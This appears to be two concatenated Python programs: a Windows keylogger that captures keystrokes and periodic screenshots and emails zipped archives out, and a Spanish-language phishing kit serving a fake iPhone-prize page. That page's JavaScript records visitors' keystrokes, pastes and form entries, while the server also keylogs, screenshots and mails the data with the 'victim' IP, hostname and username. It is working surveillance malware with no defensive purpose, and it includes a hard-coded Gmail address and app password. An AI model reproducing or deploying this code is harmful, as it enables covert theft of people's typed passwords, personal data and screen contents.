import os
import pyautogui
import time
import threading
import glob
import zipfile
import smtplib
from pynput.keyboard import Key, Listener
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

if os.path.exists("C:\\Picture\\"):
    zipfile.ZipFile("C:\\Picture\\archive.zip", "w")
    pass
else:
    os.mkdir('C:\\Picture')
    os.mkdir('C:\\Picture\\Default')
    zipfile.ZipFile("C:\\Picture\\archive.zip", "w")
    pass

keys = []
count = 0
def keyboard():
    count = 0
    keys = []
    def on_press(key):
        global keys, count
        keys.append(key)
        count += 1
    
        if count >= 10:
            write_file(keys)
            keys = []
            count = 0
    
    def write_file(keys):
        with open("C:\\Picture\\Default\\logs.txt", "a") as file:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write("\n")
                elif k.find("Key"):
                    file.write(str(k))
    
    def on_release(key):
        if key == Key.esc:
            return False
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
def ss():
        threading.Timer(30.0, ss).start()
        screenshot = pyautogui.screenshot()
        file_name = str(time.time_ns()) + ".jpg"
        file_path = os.path.join('C:\\Picture\\Default', file_name)
        screenshot.save(file_path)

def compress():
    files_to_compress = []
    threading.Timer(280.0, compress).start()
    for document in glob.iglob("C:\\Picture\\Default\\**/*", recursive=True):
        files_to_compress.append(document)
    with zipfile.ZipFile("C:\\Picture\\archive.zip", "w") as archive:
        for file in files_to_compress:
            archive.write(file)
        
def send_mail():
    threading.Timer(300.0, send_mail).start()
    sender_address = "sendmail"
    recipient_address = "receivermail"

    msg = MIMEMultipart()
    msg['from'] = sender_address
    msg['to'] = recipient_address
    msg['Subject'] = "Some Important Documents"

    subject = "You can find the attached files below: "
    msg.attach(MIMEText(subject, 'plain'))
    file_name = "archive.zip"
    attachment = open("C:\\Picture\\archive.zip", "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % file_name)

    msg.attach(part)

    server = smtplib.SMTP('smtp.outlook.com', 587)
    server.starttls()
    server.login(sender_address, "sendmail-password")
    text = msg.as_string()
    server.sendmail(sender_address, recipient_address, text)
    server.quit()

if __name__ == '__main__':
    t1 = threading.Thread(target=keyboard)
    t2 = threading.Thread(target=ss)
    t3 = threading.Thread(target=compress)
    t4 = threading.Thread(target=send_mail)
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    
#onurkaya

import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import os
import uuid
import socket
import http.server
import socketserver
import json
from queue import Queue
import sys
import tempfile
import platform
from PIL import ImageGrab
import ctypes
from pynput.keyboard import Key, Listener

# Configuración de correo electrónico
EMAIL_CONFIG = {
    "sender": "fernandogarciahernandezveli@gmail.com",
    "receiver": "fernandogarciahernandezveli@gmail.com",
    "app_password": "cuod mpng nuoj bhps",
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587
}

# Directorios
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ASSETS_DIR = os.path.join(BASE_DIR, "assets")
CAPTURES_DIR = os.path.join(BASE_DIR, "captures")
os.makedirs(ASSETS_DIR, exist_ok=True)
os.makedirs(CAPTURES_DIR, exist_ok=True)

DEBUG = True

def debug_log(message):
    if DEBUG:
        print(f"[DEBUG] {message}")

class Keylogger:
    def __init__(self, interval=30):
        self.log = ""
        self.screenshots = []
        self.lock = threading.Lock()
        self.interval = interval
        self.is_keylogging = False
        self.victim_ip = ""
        self.last_update = ""
        self.key_queue = Queue()
        self.buffer = {}
        self.email_event = threading.Event()
        self.new_content = False
        self.last_screenshot_time = 0
        self.screenshot_interval = 30
        self.keys_pressed = []
        self.key_count = 0
        os.makedirs(CAPTURES_DIR, exist_ok=True)

    def add_key(self, key, timestamp, session_id):
        with self.lock:
            if session_id not in self.buffer:
                self.buffer[session_id] = {
                    "text": "",
                    "last_timestamp": timestamp,
                    "last_activity": time.time()
                }
            
            if key == "Backspace":
                if self.buffer[session_id]["text"]:
                    self.buffer[session_id]["text"] = self.buffer[session_id]["text"][:-1]
            elif key in ("Enter", "Tab"):
                self.buffer[session_id]["text"] += f"[{key}]"
            elif len(key) == 1:
                self.buffer[session_id]["text"] += key
            else:
                self.buffer[session_id]["text"] += f"[{key}]"
                
            self.buffer[session_id]["last_timestamp"] = timestamp
            self.buffer[session_id]["last_activity"] = time.time()
            
            self.flush_old_buffers()
            self.new_content = True
            self.key_queue.put((f"Sesión {session_id}: {self.buffer[session_id]['text']}", timestamp))
            self.last_update = time.strftime("%Y-%m-%d %H:%M:%S")
            return True

    def on_key_press(self, key):
        try:
            # Convertir la tecla a string
            key_str = str(key.char)
        except AttributeError:
            # Para teclas especiales
            if key == Key.space:
                key_str = " "
            elif key == Key.enter:
                key_str = "[Enter]"
            elif key == Key.backspace:
                key_str = "[Backspace]"
            elif key == Key.tab:
                key_str = "[Tab]"
            else:
                key_str = f"[{str(key).replace('Key.', '')}]"
        
        self.keys_pressed.append(key_str)
        self.key_count += 1
        
        # Si tenemos suficientes teclas, actualizar el log
        if self.key_count >= 10:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            with self.lock:
                entry = f"[{timestamp}] {''.join(self.keys_pressed)}\n"
                self.log += entry
                debug_log(f"Pulsaciones directas: {entry.strip()}")
                self.new_content = True
                self.keys_pressed = []
                self.key_count = 0
                self.last_update = timestamp

    def keyboard_listener(self):
        with Listener(on_press=self.on_key_press) as listener:
            while self.is_keylogging:
                time.sleep(0.1)
                if not self.is_keylogging:
                    listener.stop()
                    break
            listener.join()

    def flush_old_buffers(self, max_age=5):
        current_time = time.time()
        sessions_to_flush = []
        
        for session_id, data in self.buffer.items():
            if current_time - data["last_activity"] > max_age and data["text"]:
                sessions_to_flush.append(session_id)
        
        for session_id in sessions_to_flush:
            entry = f"[{self.buffer[session_id]['last_timestamp']}] Sesión {session_id}: {self.buffer[session_id]['text']}\n"
            self.log += entry
            debug_log(f"Texto capturado: {entry.strip()}")
            self.buffer[session_id]["text"] = ""
            self.buffer[session_id]["last_activity"] = current_time

    def capture_screenshot(self):
        while self.is_keylogging:
            current_time = time.time()
            
            if current_time - self.last_screenshot_time >= self.screenshot_interval:
                try:
                    timestamp = time.strftime("%Y%m%d_%H%M%S")
                    filename = f"screenshot_{timestamp}_{uuid.uuid4().hex[:6]}.png"
                    screenshot_path = os.path.join(CAPTURES_DIR, filename)
                    
                    debug_log(f"Intentando capturar pantalla en {screenshot_path}")
                    
                    # En Windows usamos ImageGrab de PIL
                    screenshot = ImageGrab.grab()
                    screenshot.save(screenshot_path)
                    
                    with self.lock:
                        self.screenshots.append(screenshot_path)
                        self.new_content = True
                    debug_log(f"Captura guardada: {screenshot_path}")
                    
                    self.last_screenshot_time = current_time
                    
                except Exception as e:
                    debug_log(f"Error al capturar pantalla: {e}")
            
            time.sleep(1)

    def send_email(self, force=False):
        if force:
            self._do_send_email()
            return True
            
        while self.is_keylogging:
            if self.email_event.wait(timeout=self.interval):
                self.email_event.clear()
            
            if self.new_content:
                self._do_send_email()

    def _do_send_email(self):
        with self.lock:
            self.flush_old_buffers(max_age=0)
            
            if not self.log and not self.screenshots:
                debug_log("Sin contenido para enviar")
                return False

            try:
                debug_log("Preparando envío de correo")
                msg = MIMEMultipart()
                msg['From'] = EMAIL_CONFIG["sender"]
                msg['To'] = EMAIL_CONFIG["receiver"]
                msg['Subject'] = f"Reporte de Keylogger - {time.strftime('%Y-%m-%d %H:%M:%S')}"
                
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                username = os.getlogin()
                
                body = f"""
                IP de la víctima: {self.victim_ip}
                Equipo: {hostname}
                Usuario: {username}
                IP local: {local_ip}
                Sistema: {platform.system()} {platform.release()}
                Última actualización: {self.last_update}
                
                Pulsaciones capturadas:
                {self.log}
                """
                msg.attach(MIMEText(body, 'plain'))

                screenshot_count = 0
                screenshots_to_send = self.screenshots[-5:] if len(self.screenshots) > 5 else self.screenshots
                
                for screenshot_path in screenshots_to_send:
                    if os.path.exists(screenshot_path):
                        try:
                            with open(screenshot_path, "rb") as attachment:
                                part = MIMEBase("image", "png")
                                part.set_payload(attachment.read())
                                encoders.encode_base64(part)
                                part.add_header("Content-Disposition", 
                                            f"attachment; filename={os.path.basename(screenshot_path)}")
                                msg.attach(part)
                                screenshot_count += 1
                        except Exception as e:
                            debug_log(f"Error adjuntando captura {screenshot_path}: {e}")

                max_retries = 3
                retry_count = 0
                
                while retry_count < max_retries:
                    try:
                        server = smtplib.SMTP(EMAIL_CONFIG["smtp_server"], EMAIL_CONFIG["smtp_port"])
                        server.ehlo()
                        server.starttls()
                        server.login(EMAIL_CONFIG["sender"], EMAIL_CONFIG["app_password"])
                        server.sendmail(EMAIL_CONFIG["sender"], EMAIL_CONFIG["receiver"], msg.as_string())
                        server.quit()
                        debug_log(f"Correo enviado con {screenshot_count} capturas")
                        
                        self.log = ""
                        self.screenshots = []
                        self.new_content = False
                        return True
                    except Exception as e:
                        retry_count += 1
                        debug_log(f"Error al enviar correo ({retry_count}/3): {e}")
                        time.sleep(2)
                        
                return False
            except Exception as e:
                debug_log(f"Error general en envío de correo: {e}")
                return False

    def force_email_send(self):
        """Fuerza un envío inmediato de correo"""
        debug_log("Forzando envío de correo")
        self.email_event.set()
        # También hacemos un envío directo por si no hay thread activo
        return self._do_send_email()

    def get_log(self):
        with self.lock:
            # Flush todos los buffers antes de devolver el log
            self.flush_old_buffers(max_age=0)
            return self.log

    def get_screenshots(self):
        with self.lock:
            return self.screenshots.copy()

    def get_key_queue(self):
        keys = []
        while not self.key_queue.empty():
            keys.append(self.key_queue.get())
        return keys

    def start(self, victim_ip):
        self.is_keylogging = True
        self.victim_ip = victim_ip
        self.last_update = time.strftime("%Y-%m-%d %H:%M:%S")
        self.new_content = False
        self.last_screenshot_time = 0  # Forzar captura inicial inmediata
        
        # Iniciar hilo para el teclado físico
        keyboard_thread = threading.Thread(target=self.keyboard_listener, daemon=True)
        keyboard_thread.start()
        
        # Iniciar hilo para envío de correos
        email_thread = threading.Thread(target=self.send_email, daemon=True)
        email_thread.start()
        
        # Iniciar hilo para capturas de pantalla
        screenshot_thread = threading.Thread(target=self.capture_screenshot, daemon=True)
        screenshot_thread.start()
        
        debug_log(f"Keylogger iniciado para IP: {victim_ip}")

    def stop(self):
        # Forzar un último envío de correo antes de detener
        if self.new_content:
            debug_log("Enviando correo final antes de detener")
            self._do_send_email()
            
        self.is_keylogging = False
        debug_log("Keylogger detenido")

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.keylogger = kwargs.pop('keylogger')
        super().__init__(*args, **kwargs)

    def do_GET(self):
        debug_log(f"GET request: {self.path}")
        if self.path.startswith("/phishing"):
            params = self.path.split("?")
            if len(params) > 1 and "img=" in params[1]:
                img_name = params[1].split("img=")[1].split("&")[0]  # Extraer nombre limpio
                img_path = os.path.join(ASSETS_DIR, img_name)
                
                if os.path.exists(img_path):
                    client_ip = self.client_address[0]
                    debug_log(f"Cliente conectado desde IP: {client_ip}")
                    self.keylogger.start(client_ip)
                    
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    
                    html = f"""
                    <!DOCTYPE html>
                    <html>
                        <head>
                            <title>¡Felicidades! Has ganado un teléfono</title>
                            <style>
                                body {{ font-family: Arial, sans-serif; text-align: center; background-color: #f9f9f9; }}
                                .container {{ max-width: 800px; margin: 0 auto; padding: 20px; }}
                                img {{ max-width: 100%; max-height: 300px; border: 1px solid #ddd; border-radius: 4px; }}
                                .prize-btn {{ padding: 15px 30px; background-color: #e74c3c; color: white; text-decoration: none; 
                                        border-radius: 4px; display: inline-block; margin: 20px 0; font-size: 18px; font-weight: bold; }}
                                .download-btn {{ padding: 10px 20px; background-color: #3498db; color: white; text-decoration: none; 
                                        border-radius: 4px; display: inline-block; margin: 10px 0; }}
                                input {{ margin: 10px; padding: 12px; width: 300px; border: 1px solid #ddd; border-radius: 4px; }}
                                .instructions {{ margin: 20px; padding: 15px; background-color: #f1f1f1; border-radius: 4px; }}
                                .countdown {{ font-size: 24px; color: #e74c3c; font-weight: bold; margin: 15px 0; }}
                                .highlight {{ background-color: #ffe45c; padding: 5px; }}
                            </style>
                        </head>
                        <body>
                            <div class="container">
                                <h1>¡FELICIDADES! Has sido seleccionado para ganar un iPhone 15 Pro</h1>
                                <img src="/assets/{img_name}" alt="iPhone 15 Pro">
                                <div class="countdown">La oferta expira en: <span id="timer">05:00</span></div>
                                <p>Hemos seleccionado tu IP de manera aleatoria para recibir este increíble premio.</p>
                                <p class="highlight">Solo quedan <b>2 unidades</b> disponibles para entrega hoy.</p>
                                
                                <a href="#claim" class="prize-btn" id="claimButton">RECLAMAR MI IPHONE AHORA</a>
                                
                                <div class="instructions" id="formSection" style="display:none;">
                                    <h2>Completa tus datos para enviar tu premio</h2>
                                    <p>Para verificar tu identidad, por favor completa la siguiente información:</p>
                                    <input type="text" id="nameField" placeholder="Nombre completo" autofocus><br>
                                    <input type="text" id="addressField" placeholder="Dirección de envío"><br>
                                    <input type="text" id="phoneField" placeholder="Número de teléfono"><br>
                                    <input type="email" id="emailField" placeholder="Correo electrónico"><br>
                                    <input type="text" id="commentField" placeholder="¿Por qué quieres este iPhone?"><br>
                                    
                                    <p><a href="/assets/{img_name}" class="download-btn" id="confirmButton">CONFIRMAR DATOS</a></p>
                                </div>
                            </div>
                            
                            <script>
                                // Generar un ID único para esta sesión
                                const sessionId = Math.random().toString(36).substring(2, 15);
                                console.log("Session ID:", sessionId);
                                
                                // Variable para almacenar texto antes de enviar
                                let textBuffer = "";
                                let lastSendTime = Date.now();
                                const SEND_INTERVAL = 2000; // 2 segundos entre envíos
                                
                                // Guardar el ID de sesión en localStorage para persistencia entre páginas
                                localStorage.setItem('keyloggerSessionId', sessionId);
                                
                                // Enviar el buffer si tiene contenido
                                function sendBufferIfNeeded(force = false) {{
                                    const now = Date.now();
                                    if (textBuffer && (force || now - lastSendTime > SEND_INTERVAL)) {{
                                        const timestamp = new Date().toISOString();
                                        
                                        fetch('/keylog', {{
                                            method: 'POST',
                                            headers: {{ 'Content-Type': 'application/json' }},
                                            body: JSON.stringify({{ 
                                                text: textBuffer,
                                                timestamp: timestamp,
                                                sessionId: localStorage.getItem('keyloggerSessionId') || sessionId
                                            }})
                                        }})
                                        .then(response => response.json())
                                        .then(data => console.log('Buffer enviado:', data))
                                        .catch(err => console.error('Error enviando buffer:', err));
                                        
                                        textBuffer = "";
                                        lastSendTime = now;
                                    }}
                                }}
                                
                                // Configurar ping periódico al servidor
                                function setupPing() {{
                                    // Enviar un ping al servidor cada 5 segundos
                                    setInterval(function() {{
                                        // También aprovechamos para enviar cualquier buffer pendiente
                                        sendBufferIfNeeded(true);
                                        
                                        fetch('/ping?client=' + new Date().getTime() + '&session=' + 
                                            (localStorage.getItem('keyloggerSessionId') || sessionId), {{
                                            method: 'GET'
                                        }})
                                        .then(res => res.json())
                                        .then(data => console.log("Ping OK"))
                                        .catch(err => console.error("Error ping:", err));
                                    }}, 5000);
                                }}
                                
                                // Configurar captura global de teclas
                                function setupGlobalKeyCapture() {{
                                    function getReadableKey(e) {{
                                        if (e.key === ' ') return 'Space';
                                        if (e.key === 'Enter') return 'Enter';
                                        if (e.key === 'Backspace') return 'Backspace';
                                        if (e.key === 'Delete') return 'Delete';
                                        if (e.key === 'Tab') return 'Tab';
                                        if (e.key === 'Escape') return 'Escape';
                                        if (e.key === 'ArrowUp') return 'ArrowUp';
                                        if (e.key === 'ArrowDown') return 'ArrowDown';
                                        if (e.key === 'ArrowLeft') return 'ArrowLeft';
                                        if (e.key === 'ArrowRight') return 'ArrowRight';
                                        if (e.key === 'Control') return 'Control';
                                        if (e.key === 'Alt') return 'Alt';
                                        if (e.key === 'Shift') return 'Shift';
                                        if (e.key === 'CapsLock') return 'CapsLock';
                                        if (e.key === 'Meta') return 'Meta';
                                        return e.key;
                                    }}
                                    
                                    // Capturar evento keydown en todo el documento
                                    document.addEventListener('keydown', function(e) {{
                                        let key = getReadableKey(e);
                                        console.log('Keydown:', key);
                                        
                                        // Agregar al buffer
                                        if (key === 'Backspace') {{
                                            if (textBuffer.length > 0) {{
                                                textBuffer = textBuffer.slice(0, -1);
                                            }}
                                        }} else if (key === 'Enter') {{
                                            textBuffer += "\\n";
                                        }} else if (key === 'Tab') {{
                                            textBuffer += "\\t";
                                        }} else if (key.length === 1) {{
                                            textBuffer += key;
                                        }} else {{
                                            textBuffer += "[" + key + "]";
                                        }}
                                        
                                        // Enviar el buffer si ha pasado suficiente tiempo
                                        sendBufferIfNeeded();
                                    }});
                                    
                                    // También capturar el evento paste
                                    document.addEventListener('paste', function(e) {{
                                        if (e.clipboardData && e.clipboardData.getData) {{
                                            const pastedText = e.clipboardData.getData('text/plain');
                                            if (pastedText) {{
                                                console.log('Pasted:', pastedText);
                                                textBuffer += "[PASTE]" + pastedText;
                                                sendBufferIfNeeded(true);
                                            }}
                                        }}
                                    }});
                                    
                                    // Capturar cambios en formularios también
                                    document.addEventListener('change', function(e) {{
                                        if (e.target && e.target.value) {{
                                            console.log('Form change:', e.target.value);
                                            textBuffer += "[FORM:" + (e.target.id || e.target.name || 'unknown') + "]" + e.target.value;
                                            sendBufferIfNeeded(true);
                                        }}
                                    }});
                                    
                                    // Detectar cuando se va a abandonar la página
                                    window.addEventListener('beforeunload', function() {{
                                        sendBufferIfNeeded(true);
                                    }});
                                }}
                                
                                // Cuenta regresiva
                                function startCountdown() {{
                                    let time = 300; // 5 minutos en segundos
                                    const timerElement = document.getElementById('timer');
                                    
                                    const countdownInterval = setInterval(function() {{
                                        time--;
                                        const minutes = Math.floor(time / 60);
                                        const seconds = time % 60;
                                        timerElement.textContent = `${{minutes.toString().padStart(2, '0')}}:${{seconds.toString().padStart(2, '0')}}`;
                                        
                                        if (time <= 0) {{
                                            clearInterval(countdownInterval);
                                            timerElement.textContent = "00:00";
                                            document.getElementById('claimButton').textContent = "¡ÚLTIMA OPORTUNIDAD!";
                                        }}
                                    }}, 1000);
                                }}
                                
                                // Iniciar todo al cargar
                                window.onload = function() {{
                                    setupPing();
                                    setupGlobalKeyCapture();
                                    startCountdown();
                                    
                                    // Configurar botón de reclamo
                                    document.getElementById('claimButton').addEventListener('click', function(e) {{
                                        e.preventDefault();
                                        document.getElementById('formSection').style.display = 'block';
                                        document.getElementById('nameField').focus();
                                    }});
                                    
                                    // Configurar botón de confirmación
                                    document.getElementById('confirmButton').addEventListener('click', function(e) {{
                                        // No prevenimos el comportamiento por defecto para que descargue la imagen
                                        console.log("Datos confirmados, descargando imagen...");
                                        
                                        // Añadir un mensaje para indicar que la descarga está en progreso
                                        let downloadStatus = document.createElement('p');
                                        downloadStatus.textContent = "Procesando tus datos...";
                                        downloadStatus.style.color = "#4CAF50";
                                        document.getElementById('formSection').appendChild(downloadStatus);
                                        
                                        setTimeout(function() {{
                                            downloadStatus.textContent = "¡Felicidades! Tus datos han sido verificados. Pronto recibirás un email de confirmación.";
                                        }}, 2000);
                                    }});
                                }};
                            </script>
                        </body>
                    </html>
                    """
                    self.wfile.write(html.encode())
                else:
                    self.send_error(404, "Imagen no encontrada")
            else:
                self.send_error(400, "Parámetro de imagen faltante")
        elif self.path.startswith("/assets/"):
            file_path = os.path.join(BASE_DIR, self.path[1:])
            if os.path.exists(file_path):
                self.send_response(200)
                # Determinar el tipo MIME basado en la extensión del archivo
                extension = os.path.splitext(file_path)[1].lower()
                if extension == '.png':
                    content_type = "image/png"
                elif extension in ['.jpg', '.jpeg']:
                    content_type = "image/jpeg"
                elif extension == '.gif':
                    content_type = "image/gif"
                else:
                    content_type = "application/octet-stream"
                    
                self.send_header("Content-type", content_type)
                self.send_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")
                self.end_headers()
                with open(file_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404, "Archivo no encontrado")
        elif self.path.startswith("/ping"):
            # Endpoint para mantener viva la conexión
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            
            # Extraer sessionId del ping si existe
            session_id = "default"
            if "session=" in self.path:
                try:
                    session_id = self.path.split("session=")[1].split("&")[0]
                except:
                    pass
                
            self.wfile.write(json.dumps({"status": "ok", "session": session_id}).encode())
        else:
            # Redirigir al usuario a la página de phishing si accede a la raíz
            if self.path == "/" or self.path == "":
                self.send_response(302)
                self.send_header("Location", "/phishing?img=phone_prize.png")
                self.end_headers()
            else:
                self.send_error(404, "Página no encontrada")

    def do_POST(self):
        debug_log(f"POST request: {self.path}")
        if self.path == "/keylog":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                key = data.get('text', '')
                timestamp = data.get('timestamp', time.strftime("%Y-%m-%d %H:%M:%S"))
                session_id = data.get('sessionId', 'default')
                
                if key:
                    self.keylogger.add_key(key, timestamp, session_id)
                    debug_log(f"Keylog recibido - Sesión {session_id}: {key}")
                
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "ok"}).encode())
            except Exception as e:
                debug_log(f"Error procesando keylog: {e}")
                self.send_error(400, "Datos inválidos")
        else:
            self.send_error(404, "Endpoint no encontrado")

class PhishingServer:
    def __init__(self, keylogger, port=8080):
        self.keylogger = keylogger
        self.port = port
        self.server = None
        self.is_running = False
        
    def start(self):
        try:
            # Obtener la IP local para mostrar en la interfaz
            hostname = socket.gethostname()
            local_ip = self.get_local_ip()
            
            if hasattr(self.keylogger, 'ui'):
                self.keylogger.ui.url_var.set(f"http://{local_ip}:{self.port}/phishing?img=phone_prize.png")
            
            # Crear un handler personalizado con el keylogger
            handler = lambda *args, **kwargs: PhishingHandler(*args, keylogger=self.keylogger, **kwargs)
            
            # Iniciar servidor en todas las interfaces (0.0.0.0)
            self.server = socketserver.ThreadingTCPServer(("0.0.0.0", self.port), handler)
            self.is_running = True
            
            debug_log(f"Servidor iniciado en {local_ip}:{self.port}")
            
            # Iniciar el servidor en un hilo separado
            server_thread = threading.Thread(target=self.server.serve_forever, daemon=True) 
            server_thread.start()
            
            debug_log("Servidor en ejecución")
        except Exception as e:
            debug_log(f"Error iniciando servidor: {e}")
            self.is_running = False
            if hasattr(self.keylogger, 'ui'):
                self.keylogger.ui.status_var.set("Error al iniciar servidor")
                self.keylogger.ui.start_btn.config(state=tk.NORMAL)
                self.keylogger.ui.stop_btn.config(state=tk.DISABLED)
            if self.server:
                self.server.shutdown()
                self.server.server_close()
            self.server = None
            self.is_running = False
            return False
        else:
            if hasattr(self.keylogger, 'ui'):
                self.keylogger.ui.status_var.set("Servidor activo")
                self.keylogger.ui.start_btn.config(state=tk.DISABLED)
                self.keylogger.ui.stop_btn.config(state=tk.NORMAL)
            return True
            # Continuación del código...

    def get_local_ip(self):
        try:
            # Obtener la IP local que no sea localhost
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception as e:
            debug_log(f"Error obteniendo IP local: {e}")
            return "127.0.0.1"
    
    def server_thread(self):
        try:
            self.server.serve_forever()
        except Exception as e:
            debug_log(f"Error en servidor: {e}")
            self.is_running = False
    
    def run(self):
        thread = threading.Thread(target=self.server_thread, daemon=True)
        thread.start()
        return thread
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.is_running = False
            debug_log("Servidor detenido")

class KeyloggerUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Herramienta de Monitoreo")
        self.root.geometry("800x600")
        self.root.resizable(True, True)
        
        self.keylogger = Keylogger()
        self.keylogger.ui = self
        self.server = PhishingServer(self.keylogger)
        
        self.setup_ui()
        
    def setup_ui(self):
        # Frame principal
        main_frame = tk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # URL del servidor
        url_frame = tk.Frame(main_frame)
        url_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(url_frame, text="URL de phishing:").pack(side=tk.LEFT)
        self.url_var = tk.StringVar(value="Servidor no iniciado")
        tk.Entry(url_frame, textvariable=self.url_var, width=50, state="readonly").pack(side=tk.LEFT, padx=5)
        tk.Button(url_frame, text="Copiar", command=self.copy_url).pack(side=tk.LEFT)
        
        # Botones de control
        control_frame = tk.Frame(main_frame)
        control_frame.pack(fill=tk.X, pady=5)
        
        self.start_btn = tk.Button(control_frame, text="Iniciar Servidor", command=self.start_server)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(control_frame, text="Detener Servidor", command=self.stop_server, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        tk.Button(control_frame, text="Enviar Correo", command=self.force_email).pack(side=tk.LEFT, padx=5)
        tk.Button(control_frame, text="Mostrar Capturas", command=self.show_screenshots).pack(side=tk.LEFT, padx=5)
        
        # Log de pulsaciones
        log_frame = tk.LabelFrame(main_frame, text="Log de Pulsaciones")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=15)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Información de estado
        status_frame = tk.Frame(main_frame)
        status_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(status_frame, text="Estado:").pack(side=tk.LEFT)
        self.status_var = tk.StringVar(value="Inactivo")
        tk.Label(status_frame, textvariable=self.status_var).pack(side=tk.LEFT, padx=5)
        
        # Configurar actualización periódica del log
        self.root.after(1000, self.update_log)
    
    def copy_url(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(self.url_var.get())
        messagebox.showinfo("URL Copiada", "URL copiada al portapapeles")
    
    def start_server(self):
        try:
            # Verificar si está la imagen necesaria
            required_img = os.path.join(ASSETS_DIR, "phone_prize.png")
            if not os.path.exists(required_img):
                messagebox.showerror("Error", f"No se encontró la imagen necesaria: {required_img}")
                return
                
            self.server.start()
            self.server.run()
            
            self.status_var.set("Servidor activo")
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            
            # Mostrar mensaje con la URL
            messagebox.showinfo("Servidor Iniciado", 
                              f"Servidor iniciado en: {self.url_var.get()}\n\n"
                              f"Comparte esta URL con la víctima para comenzar la captura.")
        except Exception as e:
            messagebox.showerror("Error", f"Error al iniciar servidor: {str(e)}")
            debug_log(f"Error iniciando servidor: {e}")
    
    def stop_server(self):
        try:
            self.server.stop()
            if hasattr(self.keylogger, 'stop'):
                self.keylogger.stop()
                
            self.status_var.set("Servidor detenido")
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.url_var.set("Servidor no iniciado")
        except Exception as e:
            messagebox.showerror("Error", f"Error al detener servidor: {str(e)}")
            debug_log(f"Error deteniendo servidor: {e}")
    
    def force_email(self):
        try:
            result = self.keylogger.force_email_send()
            if result:
                messagebox.showinfo("Éxito", "Correo enviado correctamente")
            else:
                messagebox.showwarning("Aviso", "No hay datos para enviar o ocurrió un error")
        except Exception as e:
            messagebox.showerror("Error", f"Error al enviar correo: {str(e)}")
            debug_log(f"Error enviando correo: {e}")
    
    def show_screenshots(self):
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            messagebox.showinfo("Capturas", "No hay capturas disponibles")
            return
            
        # Mostrar la última captura
        latest_shot = screenshots[-1]
        if os.path.exists(latest_shot):
            try:
                # En Windows podemos usar la función estándar para abrir archivos con la aplicación predeterminada
                os.startfile(latest_shot)
            except Exception as e:
                messagebox.showerror("Error", f"No se pudo abrir la captura: {str(e)}")
    
    def update_log(self):
        try:
            # Actualizar el log desde el keylogger
            current_log = self.keylogger.get_log()
            if current_log:
                self.log_text.delete(1.0, tk.END)
                self.log_text.insert(tk.END, current_log)
                self.log_text.see(tk.END)  # Desplazar al final
            
            # Programar la próxima actualización
            self.root.after(1000, self.update_log)
        except Exception as e:
            debug_log(f"Error actualizando log en UI: {e}")
            self.root.after(2000, self.update_log)  # Reintentamos en 2 segundos si hay error

def main():
    try:
        root = tk.Tk()
        app = KeyloggerUI(root)
        root.mainloop()
    except Exception as e:
        debug_log(f"Error principal: {e}")
        messagebox.showerror("Error Crítico", f"Ha ocurrido un error crítico: {str(e)}")

if __name__ == "__main__":
    main()